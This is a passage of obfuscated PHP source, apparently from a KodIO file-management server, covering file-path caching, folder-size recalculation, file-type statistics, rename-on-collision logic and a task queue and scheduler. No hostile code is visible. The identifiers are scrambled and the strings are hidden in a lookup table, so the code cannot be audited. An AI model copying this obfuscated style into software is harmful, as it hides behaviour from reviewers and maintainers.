$≠ıÜ”¶¸[577] => 1); $Æò≈⁄çò = $this->where($…ÑæêúÌ)->count(); $èªìœâ≤ = $this->where($…ÑæêúÌ)->where(array($≠ıÜ”¶¸[577] => 0))->count(); return array($≠ıÜ”¶¸[94] => $èªìœâ≤, $≠ıÜ”¶¸[95] => $Æò≈⁄çò); } public function pathInfo($Ì€òƒèö, $¸ìÄ§®¡ = false) { $ôøó¸ß„ =& $_SERVER[ëæªã÷]; $¸ìÄ§®¡ = !1; $Ì€òƒèö = intval($Ì€òƒèö); $¶˝ÎÑ˛≥ = $ôøó¸ß„[459] . intval($¸ìÄ§®¡) . $ôøó¸ß„[460] . $Ì€òƒèö; $≤∆ˆ±Ó≤ = _get(self::$cachePathInfo, $¶˝ÎÑ˛≥); if ($≤∆ˆ±Ó≤) { return $≤∆ˆ±Ó≤; } $î›Ö∞˚» = $this->sourceInfo($Ì€òƒèö); if (!$î›Ö∞˚») { return !1; } $î›Ö∞˚» = $this->_listDataApplyItem($î›Ö∞˚», $¸ìÄ§®¡); self::$cachePathInfo[$¶˝ÎÑ˛≥] = $î›Ö∞˚»; return $î›Ö∞˚»; } public static $cachePathInfoMore = array(); public function pathInfoMore($É∆¯∑áç) { $Î⁄“£û– =& $_SERVER[ëæªã÷]; $ÄóõìÑî = _get(self::$cachePathInfoMore, $É∆¯∑áç); if ($ÄóõìÑî) { return $ÄóõìÑî; } $©úÊ¨ÃÉ = $this->pathInfo($É∆¯∑áç); if (!$©úÊ¨ÃÉ) { return !1; } if ($©úÊ¨ÃÉ[$Î⁄“£û–[411]] == $Î⁄“£û–[99]) { $©úÊ¨ÃÉ[$Î⁄“£û–[93]] = $this->folderChildrenNumber($É∆¯∑áç); } self::$cachePathInfoMore[$É∆¯∑áç] = $©úÊ¨ÃÉ; return $©úÊ¨ÃÉ; } public function sourceInfo($ï¢Ø£±¯) { $ç±ö‡ˆø =& $_SERVER[ëæªã÷]; if (!$ï¢Ø£±¯) { return array(); } $ï¢Ø£±¯ = intval($ï¢Ø£±¯); $∏ùá˙›£ = $ç±ö‡ˆø[458] . $ï¢Ø£±¯; $ï∫†·˙ = _get(self::$cacheSourceInfo, $∏ùá˙›£); if ($ï∫†·˙) { return $ï∫†·˙; } $æ∂äâÊê = $this->where(array($ç±ö‡ˆø[403] => $ï¢Ø£±¯))->find(); self::$cacheSourceInfo[$∏ùá˙›£] = $æ∂äâÊê; return self::$cacheSourceInfo[$∏ùá˙›£]; } public function sourceCacheClear($ûäÌè©´ = false) { self::cacheClear($ûäÌè©´); } public static function cacheClear($“Äê„π¨ = false) { $Éƒõ¬˛§ =& $_SERVER[ëæªã÷]; if ($“Äê„π¨ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Éƒõ¬˛§[458] . $“Äê„π¨]); unset(self::$cachePathInfoMore[$“Äê„π¨]); unset(self::$cachePathInfo[$Éƒõ¬˛§[2086] . $“Äê„π¨]); unset(self::$cachePathInfo[$Éƒõ¬˛§[2087] . $“Äê„π¨]); } public function metaSet($ŒΩæ¥Ìï, $âìØ‘ˆ¿ = null, $ÆÇ∆î¡Ï = null) { $óï∂Û∫è = parent::metaSet($ŒΩæ¥Ìï, $âìØ‘ˆ¿, $ÆÇ∆î¡Ï); if ($óï∂Û∫è) { $this->sourceCacheClear($ŒΩæ¥Ìï); } return $óï∂Û∫è; } public function pathInfoByPath($¥Î©Å∫, $±∏ô‚´∆) { $·”•–Ú• =& $_SERVER[ëæªã÷]; $õ≠ÜÏô· = !$±∏ô‚´∆ ? array() : explode($·”•–Ú•[8], trim($±∏ô‚´∆, $·”•–Ú•[8])); $©ıõ–ã≤ = $¥Î©Å∫; foreach ($õ≠ÜÏô· as $ËÍŒ≈¡Æ) { $ì´…À◊Ì = array($·”•–Ú•[498] => $©ıõ–ã≤, $·”•–Ú•[32] => $ËÍŒ≈¡Æ); $ßû‰µô = $this->where($ì´…À◊Ì)->select(); if (!$ßû‰µô) { return !1; } $ßû‰µô = array_sort_by($ßû‰µô, $·”•–Ú•[431]); $©ıõ–ã≤ = $ßû‰µô[0][$·”•–Ú•[403]]; } return $this->pathInfo($©ıõ–ã≤, !0); } protected function updateModifyTime($ﬁ˝˘ÆÍﬂ) { $ßŒÓ‚¸‰ =& $_SERVER[ëæªã÷]; $ı üõ™Œ = defined($ßŒÓ‚¸‰[474]) ? USER_ID : $ßŒÓ‚¸‰[200]; if (!$ﬁ˝˘ÆÍﬂ) { return; } if (!is_array($ﬁ˝˘ÆÍﬂ)) { $ﬁ˝˘ÆÍﬂ = array($ﬁ˝˘ÆÍﬂ); } foreach ($ﬁ˝˘ÆÍﬂ as $üÒ§ç§¢ => $ïêäÚÂ‚) { $ﬁ˝˘ÆÍﬂ[$üÒ§ç§¢] = intval($ïêäÚÂ‚); $this->sourceCacheClear($ïêäÚÂ‚); } $Ë‚è‰Õ’ = array($ßŒÓ‚¸‰[403] => array($ßŒÓ‚¸‰[7], $ﬁ˝˘ÆÍﬂ)); $Ö’ñÙ‰‰ = array($ßŒÓ‚¸‰[583] => $ı üõ™Œ, $ßŒÓ‚¸‰[425] => time()); $this->where($Ë‚è‰Õ’)->save($Ö’ñÙ‰‰); } public function folderSizeReset($ÛŒïÉøä, $≈◊«›˜Ó = false) { $«…≤ºæ  =& $_SERVER[ëæªã÷]; if ($this->statusIgnoreResetSpace) { return; } $Âß ™∞Ä = $this->sourceInfo($ÛŒïÉøä); $ÜÀñ∑ÖŒ = $«…≤ºæ [2088] . $ÛŒïÉøä; CacheLock::lock($ÜÀñ∑ÖŒ, 20); if ($≈◊«›˜Ó === !1) { $this->sourceCacheClear($ÛŒïÉøä); $Âß ™∞Ä = $this->sourceInfo($ÛŒïÉøä); $≈¶æ˛‚¬ = array($«…≤ºæ [402] => $ÛŒïÉøä, $«…≤ºæ [430] => 0); $Ùé¨Ê»‡ = $this->where($≈¶æ˛‚¬)->sum($«…≤ºæ [90]); $≈◊«›˜Ó = intval($Ùé¨Ê»‡) - intval($Âß ™∞Ä[$«…≤ºæ [90]]); } if ($≈◊«›˜Ó == 0) { return CacheLock::unlock($ÜÀñ∑ÖŒ); } $∫ı¢≥µ˘ = $this->parentLevelArray($Âß ™∞Ä[$«…≤ºæ [521]]); if (!$∫ı¢≥µ˘) { $∫ı¢≥µ˘ = array(); } $∫ı¢≥µ˘[] = $Âß ™∞Ä[$«…≤ºæ [403]]; $≈¶æ˛‚¬ = array($«…≤ºæ [403] => array($«…≤ºæ [419], $∫ı¢≥µ˘)); if ($≈◊«›˜Ó < 0) { $≈¶æ˛‚¬[$«…≤ºæ [90]] = array($«…≤ºæ [991], abs($≈◊«›˜Ó)); } $this->where($≈¶æ˛‚¬)->setAdd($«…≤ºæ [90], $≈◊«›˜Ó); CacheLock::unlock($ÜÀñ∑ÖŒ); $∂ıÉ´Ë° = $«…≤ºæ [2089] . $Âß ™∞Ä[$«…≤ºæ [412]] . $«…≤ºæ [4] . $Âß ™∞Ä[$«…≤ºæ [504]]; $ï∑∏¥Ç◊ = array($Âß ™∞Ä[$«…≤ºæ [412]], $Âß ™∞Ä[$«…≤ºæ [504]]); TaskRun::timeLimitCall($∂ıÉ´Ë°, $«…≤ºæ [2090], $ï∑∏¥Ç◊, 1.5); } public function folderSizeResetChildren($î’ßÉî€) { $Âõ‹üÈÿ =& $_SERVER[ëæªã÷]; $this->sourceCacheClear($î’ßÉî€); $ﬂ≥≈¯Íä = $this->sourceInfo($î’ßÉî€); $∞˜àŸÚ = array($Âõ‹üÈÿ[577] => 1, $Âõ‹üÈÿ[581] => $ﬂ≥≈¯Íä[$Âõ‹üÈÿ[504]], $Âõ‹üÈÿ[584] => array($Âõ‹üÈÿ[544], $ﬂ≥≈¯Íä[$Âõ‹üÈÿ[521]] . $î’ßÉî€ . $Âõ‹üÈÿ[545])); $≤Ä±ÇÊˆ = $Âõ‹üÈÿ[2091]; $¿Ã¢˙Å« = $this->field($≤Ä±ÇÊˆ)->where($∞˜àŸÚ)->select(); $∞˜àŸÚ[$Âõ‹üÈÿ[411]] = 0; $¢Ÿ»Í€‘ = $this->field($≤Ä±ÇÊˆ)->where($∞˜àŸÚ)->select(); if (!$¢Ÿ»Í€‘) { return; } $¿Ã¢˙Å«[] = $ﬂ≥≈¯Íä; $¿Ã¢˙Å« = array_to_keyvalue($¿Ã¢˙Å«, $Âõ‹üÈÿ[403]); foreach ($¿Ã¢˙Å« as $Õ¬äÙÔ≥ => $÷„Ñ€‰›) { $¿Ã¢˙Å«[$Õ¬äÙÔ≥][$Âõ‹üÈÿ[2092]] = $¿Ã¢˙Å«[$Õ¬äÙÔ≥][$Âõ‹üÈÿ[90]]; $¿Ã¢˙Å«[$Õ¬äÙÔ≥][$Âõ‹üÈÿ[90]] = 0; } foreach ($¢Ÿ»Í€‘ as $÷„Ñ€‰›) { $°ÆòÓÑ  = $÷„Ñ€‰›[$Âõ‹üÈÿ[498]] . $Âõ‹üÈÿ[12]; if (!isset($¿Ã¢˙Å«[$°ÆòÓÑ ])) { continue; } if ($÷„Ñ€‰›[$Âõ‹üÈÿ[431]] == $¿Ã¢˙Å«[$°ÆòÓÑ ][$Âõ‹üÈÿ[431]]) { $¿Ã¢˙Å«[$°ÆòÓÑ ][$Âõ‹üÈÿ[90]] += $÷„Ñ€‰›[$Âõ‹üÈÿ[90]]; } } foreach ($¿Ã¢˙Å« as $÷„Ñ€‰›) { $∏°ô¨âπ = $this->parentLevelArray($÷„Ñ€‰›[$Âõ‹üÈÿ[521]]); foreach ($∏°ô¨âπ as $°ÆòÓÑ ) { $°ÆòÓÑ  = $°ÆòÓÑ  . $Âõ‹üÈÿ[12]; if (!isset($¿Ã¢˙Å«[$°ÆòÓÑ ])) { continue; } if ($÷„Ñ€‰›[$Âõ‹üÈÿ[431]] == $¿Ã¢˙Å«[$°ÆòÓÑ ][$Âõ‹üÈÿ[431]]) { $¿Ã¢˙Å«[$°ÆòÓÑ ][$Âõ‹üÈÿ[90]] += $÷„Ñ€‰›[$Âõ‹üÈÿ[90]]; } } } $„Ô∑°˜Û = array(); foreach ($¿Ã¢˙Å« as $÷„Ñ€‰›) { if ($÷„Ñ€‰›[$Âõ‹üÈÿ[90]] == $÷„Ñ€‰›[$Âõ‹üÈÿ[2092]]) { continue; } $„Ô∑°˜Û[] = array($Âõ‹üÈÿ[403], $÷„Ñ€‰›[$Âõ‹üÈÿ[403]], $Âõ‹üÈÿ[90], $÷„Ñ€‰›[$Âõ‹üÈÿ[90]]); } $this->saveAll($„Ô∑°˜Û); } public function userSpaceReset($ÌÖÔ°Å∞ = false) { $≈œ≤∞¥î =& $_SERVER[ëæªã÷]; $©Ô»ü‡ﬂ = $this->where(array($≈œ≤∞¥î[412] => self::TYPE_USER, $≈œ≤∞¥î[504] => $ÌÖÔ°Å∞, $≈œ≤∞¥î[411] => 0))->sum($≈œ≤∞¥î[90]); $©Ô»ü‡ﬂ = !$©Ô»ü‡ﬂ || $©Ô»ü‡ﬂ <= 0 ? 0 : $©Ô»ü‡ﬂ; Model($≈œ≤∞¥î[513])->userEdit($ÌÖÔ°Å∞, array($≈œ≤∞¥î[1785] => $©Ô»ü‡ﬂ)); } public function targetSpaceUpdate($Áì§‹Ñâ, $¬“®ﬂ˜∏) { $øÎÃãï =& $_SERVER[ëæªã÷]; if (!$¬“®ﬂ˜∏) { return; } if (!in_array($Áì§‹Ñâ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $∆é√ÿ„† = $this->targetSpaceSize($Áì§‹Ñâ, $¬“®ﬂ˜∏); if ($Áì§‹Ñâ == self::TYPE_USER) { Model($øÎÃãï[513])->userEdit($¬“®ﬂ˜∏, array($øÎÃãï[1785] => $∆é√ÿ„†)); } else { if ($Áì§‹Ñâ == self::TYPE_GROUP) { Model($øÎÃãï[522])->groupEdit($¬“®ﬂ˜∏, array($øÎÃãï[1785] => $∆é√ÿ„†)); } } } public function targetSpaceSize($©æÇıÌÕ, $‰∫óÑéÁ) { $í˙Ø“Æ≈ =& $_SERVER[ëæªã÷]; $§œ∂Û’ﬁ = $this->sourceRoot($©æÇıÌÕ, $‰∫óÑéÁ, !0); if (!$§œ∂Û’ﬁ) { return 0; } $«ÊÕΩ¬Ë = floatval($§œ∂Û’ﬁ[$í˙Ø“Æ≈[90]]); $»ÜÛ˘ú· = array($í˙Ø“Æ≈[584] => array($í˙Ø“Æ≈[544], $í˙Ø“Æ≈[531] . $§œ∂Û’ﬁ[$í˙Ø“Æ≈[403]] . $í˙Ø“Æ≈[545])); $∑πÌ¯öÓ = Model($í˙Ø“Æ≈[429])->field($í˙Ø“Æ≈[418])->where($»ÜÛ˘ú·)->select(); $∑πÌ¯öÓ = array_to_keyvalue($∑πÌ¯öÓ, $í˙Ø“Æ≈[12], $í˙Ø“Æ≈[403]); $∑πÌ¯öÓ = array_unique(array_filter($∑πÌ¯öÓ)); if ($∑πÌ¯öÓ) { $»ÜÛ˘ú· = array($í˙Ø“Æ≈[418] => array($í˙Ø“Æ≈[419], $∑πÌ¯öÓ)); $«ÊÕΩ¬Ë += floatval($this->where($»ÜÛ˘ú·)->sum($í˙Ø“Æ≈[90])); } $«ÊÕΩ¬Ë = !$«ÊÕΩ¬Ë || $«ÊÕΩ¬Ë <= 0 ? 0 : $«ÊÕΩ¬Ë; return $«ÊÕΩ¬Ë; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($÷åûËÄ) { return $this->fileTypeProfile($÷åûËÄ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ù·˙ˆ¢Œ) { return $this->fileTypeProfile($ù·˙ˆ¢Œ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ñ∑òŸıò, $ÔÊå±Œ) { $ß€‚Ï˙‡ =& $_SERVER[ëæªã÷]; $®±†∏¯Ø = $ß€‚Ï˙‡[2093] . $ñ∑òŸıò . $ß€‚Ï˙‡[11] . $ÔÊå±Œ; $è—ıü§˛ = Cache::get($®±†∏¯Ø); if ($è—ıü§˛) { return $è—ıü§˛; } $È—ÇÌƒœ = array($ß€‚Ï˙‡[577] => 0); if ($ñ∑òŸıò != !1) { $È—ÇÌƒœ[$ß€‚Ï˙‡[504]] = $ñ∑òŸıò; $È—ÇÌƒœ[$ß€‚Ï˙‡[412]] = $ÔÊå±Œ; } $¥∑çÑÉ– = array(); $¥∑çÑÉ–[$ß€‚Ï˙‡[2094]] = array($ß€‚Ï˙‡[2095] => LNG($ß€‚Ï˙‡[2094]), $ß€‚Ï˙‡[2096] => $this->where($È—ÇÌƒœ)->count(), $ß€‚Ï˙‡[579] => $this->where($È—ÇÌƒœ)->sum($ß€‚Ï˙‡[90])); $–Õøë–ò = KodIO::fileTypeList(); foreach ($–Õøë–ò as $¯‹ñòëæ => $¬¥Ã˘·Ê) { $È—ÇÌƒœ[$ß€‚Ï˙‡[413]] = $this->fileTypeWhere($¯‹ñòëæ); $¥∑çÑÉ–[$¯‹ñòëæ] = array($ß€‚Ï˙‡[2095] => $¬¥Ã˘·Ê[$ß€‚Ï˙‡[32]], $ß€‚Ï˙‡[2096] => $this->where($È—ÇÌƒœ)->count(), $ß€‚Ï˙‡[579] => $this->where($È—ÇÌƒœ)->sum($ß€‚Ï˙‡[90])); } Cache::set($®±†∏¯Ø, $¥∑çÑÉ–, 1200); return $¥∑çÑÉ–; } public function fileNameExist($’ÈèÏâı, $·°õ∆› ) { $˙ê¬π¢‚ =& $_SERVER[ëæªã÷]; $œ˝Ú«– = $this->where(array($˙ê¬π¢‚[498] => $’ÈèÏâı, $˙ê¬π¢‚[32] => $·°õ∆› , $˙ê¬π¢‚[431] => 0))->find(); return is_array($œ˝Ú«–) ? $œ˝Ú«–[$˙ê¬π¢‚[403]] : !1; } public function childList($∏≈ã®Ôù) { $Í πÓèá =& $_SERVER[ëæªã÷]; $ë√ÛÔÛÿ = $Í πÓèá[2071] . $∏≈ã®Ôù; if (isset(self::$cacheChildList[$ë√ÛÔÛÿ])) { return self::$cacheChildList[$ë√ÛÔÛÿ]; } $ô€ãÕÍ = array($Í πÓèá[498] => intval($∏≈ã®Ôù), $Í πÓèá[431] => 0); $Îú‰∂Ì˘ = $this->where($ô€ãÕÍ)->select(); $Îú‰∂Ì˘ = $Îú‰∂Ì˘ ? $Îú‰∂Ì˘ : array(); self::$cacheChildList[$ë√ÛÔÛÿ] = $Îú‰∂Ì˘; foreach ($Îú‰∂Ì˘ as $⁄±∫˙π¯) { $ë√ÛÔÛÿ = $Í πÓèá[458] . $⁄±∫˙π¯[$Í πÓèá[403]]; self::$cacheSourceInfo[$ë√ÛÔÛÿ] = $⁄±∫˙π¯; } return $Îú‰∂Ì˘; } public function fileNameAuto($∂°∂§ÿö, $ﬂöÙ›πŸ, $ÛœôΩØ¡ = REPEAT_RENAME, $˝‚’Ì≠ˆ = false) { $¯∑‘ÀÜ„ =& $_SERVER[ëæªã÷]; $ÙºñòÛ⁄ = array($¯∑‘ÀÜ„[498] => $∂°∂§ÿö, $¯∑‘ÀÜ„[431] => 0, $¯∑‘ÀÜ„[32] => array($¯∑‘ÀÜ„[387], $ﬂöÙ›πŸ . $¯∑‘ÀÜ„[388])); $√»‚„å¡ = $this->field($¯∑‘ÀÜ„[32])->where($ÙºñòÛ⁄)->select(); $ñîè¬µñ = array_to_keyvalue($√»‚„å¡, $¯∑‘ÀÜ„[12], $¯∑‘ÀÜ„[32]); return $this->fileNameAutoGet($ñîè¬µñ, $ﬂöÙ›πŸ, $ÛœôΩØ¡, $˝‚’Ì≠ˆ); } public function fileNameAutoGet($∂öö‹û , $Ä‹Ë∑ †, $öôÂ§≈‡, $êŸ˜øÕ¬) { $„◊´Òùï =& $_SERVER[ëæªã÷]; if ($öôÂ§≈‡ == REPEAT_REPLACE || !$∂öö‹û  || !in_array_not_case($Ä‹Ë∑ †, $∂öö‹û ) || $êŸ˜øÕ¬ && $öôÂ§≈‡ != REPEAT_RENAME_FOLDER) { return $Ä‹Ë∑ †; } if ($öôÂ§≈‡ == REPEAT_SKIP) { return !1; } $ÙüüÎ« = $„◊´Òùï[10] . get_path_ext($Ä‹Ë∑ †); $ÙüüÎ« = $ÙüüÎ« == $„◊´Òùï[10] || $êŸ˜øÕ¬ ? $„◊´Òùï[12] : $ÙüüÎ«; for ($ã÷ú˘•Ω = 1; $ã÷ú˘•Ω <= count($∂öö‹û ) + 1; $ã÷ú˘•Ω++) { $Â°®±Û¨ = substr($Ä‹Ë∑ †, 0, strlen($Ä‹Ë∑ †) - strlen($ÙüüÎ«)); $—‘»Âπì = $Â°®±Û¨ . "\50{$ã÷ú˘•Ω}\51{$ÙüüÎ«}"; if (!in_array_not_case($—‘»Âπì, $∂öö‹û )) { return $—‘»Âπì; } } } } goto BôÉ¢¿È±á; AÑ£À∏Ç⁄Ö: class TaskHttp extends Task { protected function startAfter() { $–ÆΩ¡©Ç =& $_SERVER[ëæªã÷]; $§…Ó÷Üö =& $this->task; $§…Ó÷Üö[$–ÆΩ¡©Ç[1699]] = 1; Hook::bind($–ÆΩ¡©Ç[1668], array($this, $–ÆΩ¡©Ç[1700])); Hook::bind($–ÆΩ¡©Ç[1670], array($this, $–ÆΩ¡©Ç[1701])); Hook::bind($–ÆΩ¡©Ç[1672], array($this, $–ÆΩ¡©Ç[1702])); } protected function endAfter() { $Åƒ⁄∆Àˆ =& $_SERVER[ëæªã÷]; Hook::unbind($Åƒ⁄∆Àˆ[1668], array($this, $Åƒ⁄∆Àˆ[1700])); Hook::unbind($Åƒ⁄∆Àˆ[1670], array($this, $Åƒ⁄∆Àˆ[1701])); Hook::unbind($Åƒ⁄∆Àˆ[1672], array($this, $Åƒ⁄∆Àˆ[1702])); } public function progressStart($‘–ÁŸ•å) { $ò©Ïë†Â =& $_SERVER[ëæªã÷]; $§åÑ÷ü« = curl_getinfo($‘–ÁŸ•å); self::log($ò©Ïë†Â[1703] . $§åÑ÷ü«[$ò©Ïë†Â[311]]); self::valueSet($this->task[$ò©Ïë†Â[401]], $this->task); } public function progressEnd($È¡Ñ«¬Ü) { $ÛºÚóŸÑ =& $_SERVER[ëæªã÷]; self::log($ÛºÚóŸÑ[1704] . $this->task[$ÛºÚóŸÑ[401]]); $this->end(); } public function progress($πó∑©Ÿú, $ù∆°ã∏ƒ, $ÀÜã¸ìà, $†¿ì…Õõ, $Ωø´∫µÏ) { $Í˙≈¯¸ÿ =& $_SERVER[ëæªã÷]; $¯˛∞∆¨¯ =& $this->task; if ($Ωø´∫µÏ > 0) { $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]] = $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]] == 0 ? $†¿ì…Õõ : $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]]; $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[1629]] = $Ωø´∫µÏ; } else { if ($ÀÜã¸ìà > 0) { $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]] = $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]] == 0 ? $ù∆°ã∏ƒ : $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[766]]; $¯˛∞∆¨¯[$Í˙≈¯¸ÿ[1629]] = $ÀÜã¸ìà; } } $this->update(); self::log("\160\x72\157\x67\x72\145\x73\x73\x48\164\x74\160\72\x64\157\167\156\72{$ÀÜã¸ìà}\x2f{$ù∆°ã∏ƒ}\x3b\40\165\160\154\157\x61\144\x3a{$Ωø´∫µÏ}\57{$†¿ì…Õõ}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\x51\165\x65\165\x65\114\x65\x6e\147\164\x68"; const QUEUE_DATA = "\164\141\163\153\x51\x75\145\165\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($÷”àì´‹, $ò¯‹±ΩÜ = array(), $“£ëÙ∆î = '', $ïˆÁ·£ı = '') { $ÜÏÓÖÛ† =& $_SERVER[ëæªã÷]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ïˆÁ·£ı && array_find_by_field(self::$listData, $ÜÏÓÖÛ†[105], $ïˆÁ·£ı)) { return !0; } self::$listData[] = array($ÜÏÓÖÛ†[268] => $÷”àì´‹, $ÜÏÓÖÛ†[1705] => $ò¯‹±ΩÜ, $ÜÏÓÖÛ†[451] => $“£ëÙ∆î, $ÜÏÓÖÛ†[105] => $ïˆÁ·£ı); return !0; } public static function addSubmit() { $ÿ˙ØÈ°» =& $_SERVER[ëæªã÷]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ÿ˙ØÈ°»[1706] . json_encode_force(array_to_keyvalue(self::$listData, $ÿ˙ØÈ°»[12], $ÿ˙ØÈ°»[451])), $ÿ˙ØÈ°»[1707]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ﬂÖœ–ï‰, $€˝ÑØ≠ß = array(), $¬öÙµúî = '', $©¸„Îå≠ = '') { $¿¶‹µãù =& $_SERVER[ëæªã÷]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ïñ®Ô˙‚ = self::getAll(); if ($©¸„Îå≠ && array_find_by_field($Ïñ®Ô˙‚, $¿¶‹µãù[105], $©¸„Îå≠)) { return !0; } $Ïñ®Ô˙‚[] = array($¿¶‹µãù[268] => $ﬂÖœ–ï‰, $¿¶‹µãù[1705] => $€˝ÑØ≠ß, $¿¶‹µãù[451] => $¬öÙµúî, $¿¶‹µãù[105] => $©¸„Îå≠); write_log($¿¶‹µãù[1706] . $¬öÙµúî, $¿¶‹µãù[1707]); self::setAll($Ïñ®Ô˙‚); return !0; } public static function run() { $’≈¢æú≠ =& $_SERVER[ëæªã÷]; $ìÄï§ÛÎ = self::getAll(); $î÷£·¯Ç = array_shift($ìÄï§ÛÎ); if (!$î÷£·¯Ç) { return !1; } self::setAll($ìÄï§ÛÎ); $¸À§¨˜œ = timeFloat(); try { Hook::apply($î÷£·¯Ç[$’≈¢æú≠[268]], $î÷£·¯Ç[$’≈¢æú≠[1705]]); } catch (Exception $∞¯à˘ÆÔ) { } $π∆Œª‡Å = number_format(timeFloat() - $¸À§¨˜œ, 3) . $’≈¢æú≠[1644]; write_log($’≈¢æú≠[1708] . $î÷£·¯Ç[$’≈¢æú≠[451]] . $’≈¢æú≠[1709] . $π∆Œª‡Å, $’≈¢æú≠[1707]); return !0; } public static function count() { $Ä°ñ¬Ç° = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Ä°ñ¬Ç°) { return 0; } return intval($Ä°ñ¬Ç°); } public static function getAll() { $∑¶∞ﬁﬁ© = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$∑¶∞ﬁﬁ©) { return array(); } return $∑¶∞ﬁﬁ©; } public static function setAll($ôÏë≥ÿª) { $ããØ©ö∑ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ôÏë≥ÿª), $ããØ©ö∑); Cache::set(self::QUEUE_DATA, $ôÏë≥ÿª, $ããØ©ö∑); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Æ•˛∑Ëï, $·åÈÔ¥Ï = 5.0) { if (!$Æ•˛∑Ëï) { return; } $ÕªßÆ‰Ø = Cache::get($Æ•˛∑Ëï); if (!$ÕªßÆ‰Ø || timeFloat() - floatVal($ÕªßÆ‰Ø) >= $·åÈÔ¥Ï) { Cache::set($Æ•˛∑Ëï, timeFloat(), $·åÈÔ¥Ï * 10); return !0; } return !1; } public static function timeLimitCall($⁄˝ØŒ∞∂, $é±Íò†È, $ææûé»˚, $∞˜Á‡•ã = 5.0) { $∫ÑŒ¨©◊ =& $_SERVER[ëæªã÷]; if (!$⁄˝ØŒ∞∂ || !$é±Íò†È) { return; } self::$asyncAdd = !0; $üøŒ¯⁄ª = $∫ÑŒ¨©◊[1710]; $‹ÃÇŸØ  = Cache::get($üøŒ¯⁄ª, !0); $àóÏ¿è≠ = array($∫ÑŒ¨©◊[1711] => timeFloat(), $∫ÑŒ¨©◊[1712] => timeFloat(), $∫ÑŒ¨©◊[268] => $é±Íò†È, $∫ÑŒ¨©◊[1705] => $ææûé»˚, $∫ÑŒ¨©◊[206] => $∞˜Á‡•ã); if (is_array($‹ÃÇŸØ [$⁄˝ØŒ∞∂])) { $àóÏ¿è≠[$∫ÑŒ¨©◊[1712]] = $‹ÃÇŸØ [$⁄˝ØŒ∞∂][$∫ÑŒ¨©◊[1712]]; } if (is_array($‹ÃÇŸØ [$⁄˝ØŒ∞∂])) { if (timeFloat() - $‹ÃÇŸØ [$⁄˝ØŒ∞∂][$∫ÑŒ¨©◊[1711]] < $àóÏ¿è≠[$∫ÑŒ¨©◊[206]] * 0.3) { return; } $àóÏ¿è≠[$∫ÑŒ¨©◊[1712]] = $‹ÃÇŸØ [$⁄˝ØŒ∞∂][$∫ÑŒ¨©◊[1712]]; } $‹ÃÇŸØ [$⁄˝ØŒ∞∂] = $àóÏ¿è≠; Cache::set($üøŒ¯⁄ª, $‹ÃÇŸØ , 60); Cache::removeMemory($üøŒ¯⁄ª); write_log($∫ÑŒ¨©◊[1713] . $⁄˝ØŒ∞∂ . $∫ÑŒ¨©◊[81] . $é±Íò†È, $∫ÑŒ¨©◊[1707]); } public static function timeLimitCallLoop() { $Úü•Äƒ∫ =& $_SERVER[ëæªã÷]; $ÙêÄ≈˝« = array($Úü•Äƒ∫[1714]); $‰ÆÇêÈ∫ = in_array(strtolower(ACTION), $ÙêÄ≈˝«); if (!$‰ÆÇêÈ∫ && !self::$asyncAdd) { return; } $ﬂÒ¡∆∂ﬁ = $Úü•Äƒ∫[1710]; $´‰∏˚®ê = Cache::get($ﬂÒ¡∆∂ﬁ, !0); if (!$´‰∏˚®ê || count($´‰∏˚®ê) <= 0) { return; } $óÉÓ©∆À = !1; $Ü◊âåÅ‚ = timeFloat(); $ß¸„Ñãﬁ = array(); foreach ($´‰∏˚®ê as $≈É∞´Û… => $Ì˚õ°øÈ) { if ($Ü◊âåÅ‚ - $Ì˚õ°øÈ[$Úü•Äƒ∫[1712]] > $Ì˚õ°øÈ[$Úü•Äƒ∫[206]]) { $óÉÓ©∆À = !0; try { Hook::apply($Ì˚õ°øÈ[$Úü•Äƒ∫[268]], $Ì˚õ°øÈ[$Úü•Äƒ∫[1705]]); write_log($Úü•Äƒ∫[1715] . $≈É∞´Û… . $Úü•Äƒ∫[81] . $Ì˚õ°øÈ[$Úü•Äƒ∫[268]] . $Úü•Äƒ∫[1716] . ACTION, $Úü•Äƒ∫[1707]); } catch (Exception $°ÌªäıÙ) { } continue; } $ß¸„Ñãﬁ[$≈É∞´Û…] = $Ì˚õ°øÈ; } if (!$óÉÓ©∆À) { return; } if (!$ß¸„Ñãﬁ) { return Cache::remove($ﬂÒ¡∆∂ﬁ); } Cache::set($ﬂÒ¡∆∂ﬁ, $ß¸„Ñãﬁ, 60); Cache::removeMemory($ﬂÒ¡∆∂ﬁ); } public static function finished($œ°≤€»Ñ, $Â´◊≤»≠) { $ªﬁ≥£ëÉ =& $_SERVER[ëæªã÷]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ªﬁ≥£ëÉ[268] => $œ°≤€»Ñ, $ªﬁ≥£ëÉ[1705] => $Â´◊≤»≠); } private static function finishedRun() { $ƒ£¡ÆÉü =& $_SERVER[ëæªã÷]; if 